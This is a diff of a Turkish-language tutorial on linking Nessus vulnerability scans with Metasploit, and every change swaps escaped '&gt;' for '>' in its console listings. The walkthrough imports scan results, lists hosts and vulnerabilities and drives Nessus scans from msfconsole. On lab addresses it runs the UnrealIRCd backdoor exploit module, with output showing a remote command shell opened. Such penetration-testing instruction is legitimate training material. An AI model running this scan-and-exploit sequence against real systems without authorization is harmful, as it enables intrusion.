@@ -34,7 +34,7 @@ Nessus arayüzünde bir tarama yaptıktan sonra, sonuçları `.nbe` formatında 
 
 
 ```bash
-msf **&gt;** db_import /root/Nessus/nessus_scan.nbe
+msf **>** db_import /root/Nessus/nessus_scan.nbe
 **[*********]** Importing 'Nessus NBE Report' data
 **[*********]** Importing host 172.16.194.254
 **[*********]** Importing host 172.16.194.254
@@ -49,7 +49,7 @@ msf **&gt;** db_import /root/Nessus/nessus_scan.nbe
 **[*********]** Importing host 172.16.194.1
 **[*********]** Importing host 172.16.194.1
 **[*********]** Successfully imported /root/Nessus/nessus_scan.nbe
-msf **&gt;** 
+msf **>** 
 ```
 
 
@@ -62,7 +62,7 @@ msf **&gt;**
 
 
 ```bash
-msf **&gt;** hosts
+msf **>** hosts
 
 Hosts
 **=====**
@@ -77,7 +77,7 @@ address         mac  name    os_name                                            
 172.16.194.165       phpcgi  Linux phpcgi 2.6.32-38-generic-pae #83-Ubuntu SMP Wed Jan 4 12:11:13 UTC 2012 i686                    device         
 172.16.194.172               Linux Kernel 2.6 on Ubuntu 8.04 **(**hardy**)**                                                              device                                                                                                                                          
 
-msf **&gt;**
+msf **>**
 ```
 
 
@@ -90,7 +90,7 @@ Ayrıca, `services` komutuyla, bulunan IP adreslerinde çalışan servisleri gö
 
 
 ```bash
-msf **&gt;** services 172.16.194.172
+msf **>** services 172.16.194.172
 
 Services
 **========**
@@ -143,14 +143,14 @@ host            port   proto  name            state  info
 
 
 ```bash
-msf **&gt;** help vulns
+msf **>** help vulns
 Print all vulnerabilities **in **the database
 
 Usage: vulns **[**addr range]
 
   -h,--help             Show this help information
-  -p,--port **&gt;**portspec&gt;  List vulns matching this port spec
-  -s **&gt;**svc names&gt;        List vulns matching these service names
+  -p,--port **>**portspec>  List vulns matching this port spec
+  -s **>**svc names>        List vulns matching these service names
   -S,--search           Search string to filter by
   -i,--info             Display Vuln Info
 
@@ -158,7 +158,7 @@ Examples:
   vulns -p 1-65536          # only vulns with associated services
   vulns -p 1-65536 -s http  # identified as http on any port
 
-msf **&gt;**
+msf **>**
 ```
 
 
@@ -167,11 +167,11 @@ IP adreslerinde, 139 numaralı Portlara ait zafiyetleri görelim.
 
 
 ```bash
-msf **&gt;** vulns -p 139
+msf **>** vulns -p 139
 **[*********]** Time: 2012-06-15 18:32:26 UTC Vuln: host**=**172.16.194.134 name**=**NSS-11011 refs**=**NSS-11011 
 **[*********]** Time: 2012-06-15 18:32:23 UTC Vuln: host**=**172.16.194.172 name**=**NSS-11011 refs**=**NSS-11011 
 
-msf **&gt;** vulns -p 22
+msf **>** vulns -p 22
 **[*********]** Time: 2012-06-15 18:32:25 UTC Vuln: host**=**172.16.194.148 name**=**NSS-10267 refs**=**NSS-10267 
 **[*********]** Time: 2012-06-15 18:32:25 UTC Vuln: host**=**172.16.194.148 name**=**NSS-22964 refs**=**NSS-22964 
 **[*********]** Time: 2012-06-15 18:32:25 UTC Vuln: host**=**172.16.194.148 name**=**NSS-10881 refs**=**NSS-10881 
@@ -194,11 +194,11 @@ msf **&gt;** vulns -p 22
 
 
 ```bash
-msf **&gt;** vulns 172.16.194.172 -p 6667
+msf **>** vulns 172.16.194.172 -p 6667
 **[*********]** Time: 2012-06-15 18:32:23 UTC Vuln: host**=**172.16.194.172 name**=**NSS-46882 refs**=**CVE-2010-2075,BID-40820,OSVDB-65445,NSS-46882 
 **[*********]** Time: 2012-06-15 18:32:23 UTC Vuln: host**=**172.16.194.172 name**=**NSS-11156 refs**=**NSS-11156 
 **[*********]** Time: 2012-06-15 18:32:23 UTC Vuln: host**=**172.16.194.172 name**=**NSS-17975 refs**=**NSS-17975 
-msf **&gt;**
+msf **>**
 ```
 
 
@@ -207,7 +207,7 @@ msf **&gt;**
 
 
 ```bash
-msf **&gt;** search cve:2010-2075
+msf **>** search cve:2010-2075
 
 Matching Modules
 **================**
@@ -217,7 +217,7 @@ Matching Modules
    exploit/unix/irc/unreal_ircd_3281_backdoor  2010-06-12       excellent  UnrealIRCD 3.2.8.1 Backdoor Command Execution
 
 
-msf **&gt;**
+msf **>**
 ```
 
 
@@ -228,7 +228,7 @@ Arama sonucunda, `exploit/unix/irc/unreal_ircd_3281_backdoor` isimli bir exploit
 ```bash
 msf  use exploit/unix/irc/unreal_ircd_3281_backdoor
 
-msf  exploit**(**unreal_ircd_3281_backdoor**)** **&gt;** exploit
+msf  exploit**(**unreal_ircd_3281_backdoor**)** **>** exploit
 
 **[*********]** Started reverse double handler
 **[*********]** Connected to 172.16.194.172:6667...
@@ -245,7 +245,7 @@ msf  exploit**(**unreal_ircd_3281_backdoor**)** **&gt;** exploit
 [*] B: "Q4SefN7pIVSQUL2F\r "
 [*] Matching...
 [*] A is input...
-[*] Command shell session 1 opened (172.16.194.163:4444 -&gt; 172.16.194.172:35941) at 2012-06-15 15:08:51 -0400
+[*] Command shell session 1 opened (172.16.194.163:4444 -> 172.16.194.172:35941) at 2012-06-15 15:08:51 -0400
 
 ifconfig
 eth0      Link encap:Ethernet  HWaddr 00:0c:29:d1:62:80  
@@ -293,7 +293,7 @@ Exploit modülünün kullanımı ile Hedef IP adresinde bir komut satırı açı
 
 
 ```bash
-msf **&gt;** load nessus
+msf **>** load nessus
 **[*********]** Nessus Bridge **for **Metasploit 1.1
 **[**+] Type nessus_help **for **a command listing
 **[*********]** Successfully loaded plugin: nessus
@@ -305,7 +305,7 @@ Bu eklentinin bize sunduğu komutları görmek için, `nessus_help` yardım komu
 
 
 ```bash
-msf **&gt;** nessus_help
+msf **>** nessus_help
 **[**+] Nessus Help
 **[**+] type nessus_help command **for **help with specific commands
 
@@ -346,15 +346,15 @@ nessus_scan_status         List all currently running Nessus scans
 
 
 ```bash
-msf **&gt;** nessus_connect dook:s3cr3t@192.168.1.100
+msf **>** nessus_connect dook:s3cr3t@192.168.1.100
 **[**-] Warning: SSL connections are not verified **in **this release, it is possible **for **an attacker
 **[**-]          with the ability to man-in-the-middle the Nessus traffic to capture the Nessus
 **[**-]          credentials. If you are running this on a trusted network, please pass **in** 'ok'
 **[**-]          as an additional parameter to this command.
-msf **&gt;** nessus_connect dook:s3cr3t@192.168.1.100 ok
+msf **>** nessus_connect dook:s3cr3t@192.168.1.100 ok
 **[*********]** Connecting to <a href="https://192.168.1.100:8834/">https://192.168.1.100:8834/</a> as dook
 **[*********]** Authenticated
-msf **&gt;**
+msf **>**
 ```
 
 
@@ -367,14 +367,14 @@ Nessus sunucuda bulunan tarama politikalarını `nessus_policy_list` komutuyla g
 
 
 ```bash
-msf **&gt;** nessus_policy_list
+msf **>** nessus_policy_list
 **[**+] Nessus Policy List
 
 ID  Name       Owner  visability
 --  ----       -----  ----------
 1   the_works  dook   private
 
-msf **&gt;**
+msf **>**
 ```
 
 
@@ -387,16 +387,16 @@ Artık tarama politikalarını da görüntüledikten sonra yeni bir tarama başl
 
 
 ```bash
-msf **&gt;** nessus_scan_new
+msf **>** nessus_scan_new
 **[*********]** Usage:
 **[*********]**        nessus_scan_new policy id scan name targets
 **[*********]**        use nessus_policy_list to list all available policies
 
 
-msf **&gt;** nessus_scan_new 1 pwnage 192.168.1.161
+msf **>** nessus_scan_new 1 pwnage 192.168.1.161
 **[*********]** Creating scan from policy number 1, called "pwnage" and scanning 192.168.1.161
 **[*********]** Scan started.  uid is 9d337e9b-82c7-89a1-a194-4ef154b82f624de2444e6ad18a1f
-msf **&gt;**
+msf **>**
 ```
 
 
@@ -409,7 +409,7 @@ msf **&gt;**
 
 
 ```bash
-msf **&gt;** nessus_scan_status
+msf **>** nessus_scan_status
 **[**+] Running Scans
 
 Scan ID                                               Name    Owner  Started            Status   Current Hosts  Total Hosts
@@ -420,12 +420,12 @@ Scan ID                                               Name    Owner  Started    
 **[*********]** You can:
 **[**+]         Import Nessus report to database :     nessus_report_get reportid
 **[**+]         Pause a nessus scan :             nessus_scan_pause scanid
-msf **&gt;** nessus_scan_status
+msf **>** nessus_scan_status
 **[*********]** No Scans Running.
 **[*********]** You can:
 **[*********]**         List of completed scans:         nessus_report_list
 **[*********]**         Create a scan:                   nessus_scan_new policy id scan name target**(**s**)**
-msf **&gt;**
+msf **>**
 ```
 
 
@@ -438,7 +438,7 @@ Nessus taraması tamamlandığında kendi içinde bir rapor oluşturur. Metasplo
 
 
 ```bash
-msf **&gt;** nessus_report_list
+msf **>** nessus_report_list
 **[**+] Nessus Report List
 
 ID                                                    Name    Status     Date
@@ -449,15 +449,15 @@ ID                                                    Name    Status     Date
 **[*********]**         Get a list of hosts from the report:          nessus_report_hosts report id
 
 
-msf **&gt;** nessus_report_get
+msf **>** nessus_report_get
 **[*********]** Usage:
 **[*********]**        nessus_report_get report id
 **[*********]**        use nessus_report_list to list all available reports **for **importing
 
 
-msf **&gt;** nessus_report_get 9d337e9b-82c7-89a1-a194-4ef154b82f624de2444e6ad18a1f
+msf **>** nessus_report_get 9d337e9b-82c7-89a1-a194-4ef154b82f624de2444e6ad18a1f
 **[*********]** importing 9d337e9b-82c7-89a1-a194-4ef154b82f624de2444e6ad18a1f
-msf **&gt;**
+msf **>**
 ```
 
 
@@ -470,7 +470,7 @@ msf **&gt;**
 
 
 ```bash
-msf **&gt;** hosts -c address,vulns
+msf **>** hosts -c address,vulns
 
 Hosts
 **=====**
@@ -482,7 +482,7 @@ address        vulns
 
 
 ```bash
-msf **&gt;** vulns
+msf **>** vulns
 **[*********]** Time: 2010-09-28 01:51:37 UTC Vuln: host**=**192.168.1.161 port**=**3389 proto**=**tcp name**=**NSS-10940 refs**=**
 **[*********]** Time: 2010-09-28 01:51:37 UTC Vuln: host**=**192.168.1.161 port**=**1900 proto**=**udp name**=**NSS-35713 refs**=**
 **[*********]** Time: 2010-09-28 01:51:37 UTC Vuln: host**=**192.168.1.161 port**=**1030 proto**=**tcp name**=**NSS-22319 refs**=**
